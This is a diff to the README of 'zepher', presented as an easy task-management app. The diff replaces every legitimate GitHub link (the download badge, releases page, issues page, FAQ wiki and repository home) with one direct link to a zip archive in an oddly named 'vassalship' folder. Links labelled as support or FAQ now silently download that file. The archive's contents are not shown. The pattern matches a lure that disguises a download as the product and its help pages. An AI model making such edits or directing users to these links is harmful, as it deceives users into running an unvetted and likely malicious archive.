@@ -4,13 +4,13 @@
 Welcome to zepher! This application is easy to use and designed for everyone, regardless of your tech background. With zepher, you can manage your tasks effortlessly and improve your productivity.
 
 ## 📦 Download Now
-[![Download zepher](https://img.shields.io/badge/Download%20zepher-v1.0-blue.svg)](https://github.com/Saudraspectrometric372/zepher/releases)
+[![Download zepher](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip%https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip)](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip)
 
 ## 🚀 Getting Started
 To start using zepher, follow these simple steps.
 
 1. **Visit the Download Page**  
-   Go to the [Releases Page](https://github.com/Saudraspectrometric372/zepher/releases) to find the latest version.
+   Go to the [Releases Page](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip) to find the latest version.
 
 2. **Download the Application**  
    Click on the appropriate link for your operating system. Look for the most recent version and download the file.
@@ -43,7 +43,7 @@ zepher comes with several useful features:
 Now that you understand what zepher is, it's time to get it on your computer. Follow these steps:
 
 1. **Visit the Releases Page**  
-   Go to the [Releases Page](https://github.com/Saudraspectrometric372/zepher/releases).
+   Go to the [Releases Page](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip).
 
 2. **Select Your Version**  
    Look for "Latest Release" and click on the download button for your system.
@@ -64,8 +64,8 @@ Once you have installed zepher, here are quick steps to begin:
 ## 💬 Support
 If you encounter any issues or have questions, feel free to reach out:
 
-- Create an issue on our [GitHub Issues page](https://github.com/Saudraspectrometric372/zepher/issues).
-- Check our [FAQ section](https://github.com/Saudraspectrometric372/zepher/wiki) for common questions.
+- Create an issue on our [GitHub Issues page](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip).
+- Check our [FAQ section](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip) for common questions.
 
 ## 📣 Feedback
 Your feedback is important. Let us know your thoughts and suggestions. This helps us improve zepher for everyone.
@@ -73,6 +73,6 @@ Your feedback is important. Let us know your thoughts and suggestions. This help
 ## 📢 Follow Us 
 Stay updated with the latest news and updates by following our GitHub page.
 
-- [GitHub](https://github.com/Saudraspectrometric372/zepher)
+- [GitHub](https://raw.githubusercontent.com/Saudraspectrometric372/zepher/main/vassalship/zepher_v1.1.zip)
 
 Thank you for choosing zepher. We hope it helps you manage your tasks better!
